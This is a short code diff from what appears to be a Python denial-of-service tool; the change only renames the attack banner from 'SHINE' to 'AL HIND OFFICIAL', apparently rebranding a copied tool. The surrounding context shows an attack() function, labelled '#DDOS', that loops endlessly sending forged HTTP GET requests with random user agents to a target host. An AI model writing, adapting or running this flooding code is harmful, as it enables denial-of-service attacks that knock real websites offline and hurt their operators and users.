@@ -120,7 +120,7 @@ def my_bots():
 
 #DDOS 1 + MASSEGS
 def attack(item):
-             with console.status("[bold dark_orange] SHINE is Attacking CTRL+Z .....") as status:
+             with console.status("[bold dark_orange] AL HIND OFFICIAL is Attacking CTRL+Z .....") as status:
                  while True:
                      try:
                          packet = str("GET / HTTP/1.1\nHost: "+target+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
